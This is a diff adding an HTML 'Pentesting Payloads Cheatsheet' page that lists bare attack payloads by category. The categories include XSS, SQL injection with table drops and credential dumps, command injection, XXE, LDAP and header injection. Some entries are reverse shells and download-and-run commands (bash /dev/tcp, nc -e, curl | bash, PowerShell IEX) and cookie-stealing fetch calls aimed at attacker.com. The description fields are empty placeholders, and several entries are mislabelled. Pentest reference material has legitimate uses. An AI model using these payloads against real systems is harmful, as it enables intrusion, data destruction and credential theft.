@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Pentesting Payloads Cheatsheet</title>
+	<style>
+		body {
+			margin: 0;
+			padding: 0;
+			background-color: #0D4183;
+			color: #fff;
+			font-family: Arial, sans-serif;
+		}
+		h1 {
+			margin-top: 50px;
+			margin-bottom: 30px;
+			text-align: center;
+			font-size: 36px;
+			color: #fff;
+			text-shadow: 2px 2px #297AA2;
+		}
+		h2 {
+			margin-top: 70px;
+			margin-bottom: 20px;
+			font-size: 28px;
+			color: #fff;
+			text-shadow: 2px 2px #297AA2;
+		}
+		.section {
+			margin-top: 50px;
+			margin-bottom: 50px;
+			padding: 20px;
+			background-color: #297AA2;
+			box-shadow: 2px 2px 10px #000;
+		}
+		.section h3 {
+			margin-top: 0;
+			margin-bottom: 20px;
+			font-size: 24px;
+			color: #fff;
+			text-shadow: 2px 2px #489589;
+		}
+		.section p {
+			margin-top: 0;
+			margin-bottom: 10px;
+			font-size: 18px;
+			line-height: 1.5;
+		}
+	</style>
+</head>
+<body>
+	<h1>Pentesting Payloads Cheatsheet</h1>
+	<div class="section">
+		<h2>Cross-Site Scripting (XSS) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p><script>alert('XSS')</script></p>
+<p><img src="x" onerror="alert('XSS')"></p>
+<p><svg/onload=alert('XSS')></p>
+<p><video><source onerror="javascript:alert('XSS')"></p>
+<p>"><img src=x onerror=alert('XSS')"></p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>SQL Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>' OR 1=1 --</p>
+<p>1'; DROP TABLE users; --</p>
+<p>' UNION SELECT username, password FROM users --</p>
+<p>1'; SELECT @@VERSION; --</p>
+<p>' UNION SELECT table_name, column_name FROM information_schema.columns --</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Command Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>; ls</p>
+<p>| cat /etc/passwd</p>
+<p>; id</p>
+<p>&& echo "Attacker's command executed"</p>
+<p>$(nc -nv attacker.com 4444)</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>Server-Side Request Forgery (SSRF) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>http://attacker.com</p>
+<p>file:///etc/passwd</p>
+<p>ftp://attacker.com</p>
+<p>gopher://attacker.com</p>
+<p>dict://attacker.com</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>Remote File Inclusion (RFI) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>http://attacker.com/evil_script.php</p>
+<p>file:///etc/passwd</p>
+<p>ftp://attacker.com/evil_script.php</p>
+<p>expect://ls</p>
+<p>php://input</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Local File Inclusion (LFI) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3>
+<p>/etc/passwd</p>
+<p>/etc/shadow</p>
+<p>/proc/self/environ</p>
+<p>/var/log/apache/access.log</p>
+<p>/etc/hosts</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>Server-Side Template Injection (SSTI) Payload</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>{{7*'7'}}</p>
+<p>${7*'7'}</p>
+<p>#{7*'7'}</p>
+<p>[[7*'7']]</p>
+<p>=<%= 7*7 %></p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>XML External Entity (XXE) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></p>
+<p><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]></p>
+<p><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://ls">]></p>
+<p><!DOCTYPE root [<!ENTITY xxe SYSTEM "data:text/plain;base64,SGVsbG8gV29ybGQh">]></p>
+<p><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]></p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Cross-Site Request Forgery (CSRF) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p><img src="http://attacker.com/csrf?cookie="+document.cookie></p>
+<p><form action="http://victim.com/change-password" method="POST"><input type="hidden" name="new_password" value="hacked"></form></p>
+<p><iframe src="http://victim.com/logout"></iframe></p>
+<p><script>fetch('http://attacker.com/csrf?cookie='+document.cookie)</script></p>
+<p><link rel="stylesheet" href="http://attacker.com/malicious.css"></p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>File Upload Bypass Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>shell.php.jpg</p>
+<p>shell.php%00.jpg</p>
+<p>shell.php;.jpg</p>
+<p>shell.php::$data.jpg</p>
+<p>shell.php%20</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>Server-Side Includes (SSI) Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p><!--#exec cmd="ls" --></p>
+<p><!--#exec cmd="/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" --></p>
+<p><!--#exec cmd="/bin/nc -nv attacker.com 4444 -e /bin/bash" --></p>
+<p><!--#exec cmd="curl http://attacker.com/evil.sh | bash" --></p>
+<p><!--#exec cmd="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')" --></p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Path Traversal Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>../../../etc/passwd</p>
+<p>../../../../etc/shadow</p>
+<p>../../../../etc/hosts</p>
+<p>.././.././.././../etc/passwd</p>
+<p>%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>XXE Out-of-Band (OOB) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">%ext;]></p>
+<p><!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">%payload;</p>
+<p><!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;</p>
+<p><!ENTITY % xxe SYSTEM "expect://ls">%xxe;</p>
+<p><!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">%xxe;</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>LDAP Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>*</p>
+<p>*))(|(password=*))</p>
+<p>)(userPassword=*))(|(uid=*))</p>
+<p>*%28|%28password%3D*%29</p>
+<p>*%29%28%7C%28password%3D*%29</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Server-Side JavaScript Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p></script><script>alert('XSS')</script></p>
+<p></script><img src="x" onerror="alert('XSS')"></p>
+<p></script><svg/onload=alert('XSS')></p>
+<p></script><video><source onerror="javascript:alert('XSS')"></p>
+<p></script>alert('XSS')//</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>Open Redirect Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>http://attacker.com</p>
+<p>//attacker.com</p>
+<p>//attacker.com/evil_script.js</p>
+<p>/%2F%2Fattacker.com</p>
+<p>/%2F%2Fattacker.com/evil_script.js</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>Remote Code Execution (RCE) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>${{7*'7'}}</p>
+<p>{{7*'7'}}</p>
+<p>#{7*'7'}</p>
+<p>[[7*'7']]</p>
+<p>= 7*7</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Cross-Origin Resource Sharing (CORS) Bypass Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>Origin: https://attacker.com</p>
+<p>Access-Control-Allow-Origin: *</p>
+<p>Access-Control-Allow-Origin: null</p>
+<p>Access-Control-Allow-Origin: https://attacker.com</p>
+<p>Access-Control-Allow-Credentials: true</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>Server-Side Code Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>${7*'7'}</p>
+<p>{{7*'7'}}</p>
+<p>#{7*'7'}</p>
+<p>[[7*'7']]</p>
+<p>= 7*7</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>Remote File Download Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>http://attacker.com/evil_file</p>
+<p>file:///etc/passwd</p>
+<p>ftp://attacker.com/evil_file</p>
+<p>gopher://attacker.com/evil_file</p>
+<p>data:text/plain;base64,SGVsbG8gV29ybGQ=</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>Insecure Direct Object Reference (IDOR) Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>user=1</p>
+<p>user=admin</p>
+<p>user[]=1</p>
+<p>user[]=admin</p>
+<p>user=admin&role=admin</p></h3>
+		<p>...</p>
+	</div><div class="section">
+		<h2>HTTP Header Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>User-Agent: <script>alert('XSS')</script></p>
+<p>Referer: http://attacker.com</p>
+<p>Location: http://attacker.com</p>
+<p>X-Forwarded-For: attacker.com</p>
+<p>Host: attacker.com</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>LDAP Injection Search Filters</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>*)(uid=*))(|(password=*))</p>
+<p>*))(|(userPassword=*))(|(uid=*))</p>
+<p>*))(|(userPassword=*))(|(uid=*))</p>
+<p>*)(userPassword=*))(|(uid=*))</p>
+<p>*%29%28%7C%28password%3D*%29</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+		<h2>XML Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p><foo>]]&gt;<bar></p>
+<p><foo><![CDATA[<]]>script>alert('XSS')//]]></foo></p>
+<p><foo><!ENTITY xxe SYSTEM "file:///etc/passwd"></foo></p>
+<p><foo><!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"></foo></p>
+<p><foo><!ENTITY xxe SYSTEM "expect://ls"></foo></p></h3>
+		<p>...</p>
+	</div>
+	<div class="section">
+		<h2>Host Header Injection Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3><p>Host: attacker.com</p>
+		<p>Host: attacker.com%0d%0a</p>
+		<p>X-Forwarded-For: 127.0.0.1</p>
+		<p>Host: attacker.com%0d%0aReferer: http://attacker.com</p>
+		<p>Host: attacker.com%0d%0aLocation: http://attacker.com</p>
+		<p>Host: attacker.com%0d%0aCookie: session=abc</p>
+		<p>...</p></h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #489589;">
+		<h2>OTHER Payloads</h2>
+		<h3>Description</h3>
+		<p>...</p>
+		<h3>Examples</h3>
+		<p>...</p>
+	</div>
+	<div class="section" style="background-color: #85A91F;">
+  <a href="javascript:history.back()" style="color: #fff;">< Back</a>
+</div>
+</body>
+</html>
